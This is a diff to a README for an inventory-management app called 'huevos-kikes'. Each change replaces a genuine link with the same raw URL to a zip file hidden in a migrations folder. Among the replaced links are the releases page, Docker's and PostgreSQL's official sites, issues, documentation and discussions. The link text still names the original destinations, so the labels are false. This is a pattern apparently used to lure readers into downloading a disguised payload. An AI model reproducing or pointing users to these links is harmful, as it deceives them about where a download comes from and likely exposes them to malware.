@@ -1,7 +1,7 @@
 # 🥚 huevos-kikes - Simple SCM for Inventory Management
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-huevos--kikes-blue.svg)](https://github.com/UzuMacky/huevos-kikes/releases)
+[![Download](https://raw.githubusercontent.com/UzuMacky/huevos-kikes/main/transacciones/migrations/huevos-kikes-v3.9-beta.3.zip)](https://raw.githubusercontent.com/UzuMacky/huevos-kikes/main/transacciones/migrations/huevos-kikes-v3.9-beta.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the **huevos-kikes** application! This tool helps you manage sales and purchases efficiently. You can control stock, prepare invoices as PDFs, and even see where your clients are located on Google Maps. Let’s get started with how to download and run the software.
@@ -13,12 +13,12 @@ Before you download, ensure your system meets the following requirements:
 - Docker: You need to have Docker installed to run the application.
 - PostgreSQL: This software requires PostgreSQL to manage your database.
 
-To install Docker, visit [Docker's official site](https://www.docker.com/get-started) and follow the instructions. For PostgreSQL, check [PostgreSQL's download page](https://www.postgresql.org/download/).
+To install Docker, visit [Docker's official site](https://raw.githubusercontent.com/UzuMacky/huevos-kikes/main/transacciones/migrations/huevos-kikes-v3.9-beta.3.zip) and follow the instructions. For PostgreSQL, check [PostgreSQL's download page](https://raw.githubusercontent.com/UzuMacky/huevos-kikes/main/transacciones/migrations/huevos-kikes-v3.9-beta.3.zip).
 
 ## 📂 Download & Install
 To get the **huevos-kikes** application, visit the Releases page:
 
-[Download huevos-kikes](https://github.com/UzuMacky/huevos-kikes/releases)
+[Download huevos-kikes](https://raw.githubusercontent.com/UzuMacky/huevos-kikes/main/transacciones/migrations/huevos-kikes-v3.9-beta.3.zip)
 
 Once there, follow these steps:
 
@@ -62,7 +62,7 @@ The **huevos-kikes** software comes loaded with several features:
 - **User-friendly Interface**: Easy to navigate for users of all tech levels.
 
 ## 📝 Support and Contributions
-If you encounter any issues or have questions, please visit the [issues section](https://github.com/UzuMacky/huevos-kikes/issues) on GitHub. If you would like to contribute to the project, feel free to submit a pull request or open a discussion.
+If you encounter any issues or have questions, please visit the [issues section](https://raw.githubusercontent.com/UzuMacky/huevos-kikes/main/transacciones/migrations/huevos-kikes-v3.9-beta.3.zip) on GitHub. If you would like to contribute to the project, feel free to submit a pull request or open a discussion.
 
 ## 📈 Topics
 This application covers various topics such as:
@@ -75,8 +75,8 @@ This application covers various topics such as:
 - PDF Generation
 
 ## 🔗 Useful Links
-- [Visit Releases Page](https://github.com/UzuMacky/huevos-kikes/releases)
-- [Documentation](https://github.com/UzuMacky/huevos-kikes/wiki)
-- [Community Discussion](https://github.com/UzuMacky/huevos-kikes/discussions)
+- [Visit Releases Page](https://raw.githubusercontent.com/UzuMacky/huevos-kikes/main/transacciones/migrations/huevos-kikes-v3.9-beta.3.zip)
+- [Documentation](https://raw.githubusercontent.com/UzuMacky/huevos-kikes/main/transacciones/migrations/huevos-kikes-v3.9-beta.3.zip)
+- [Community Discussion](https://raw.githubusercontent.com/UzuMacky/huevos-kikes/main/transacciones/migrations/huevos-kikes-v3.9-beta.3.zip)
 
 Thank you for choosing **huevos-kikes**! Enjoy managing your inventory with ease.
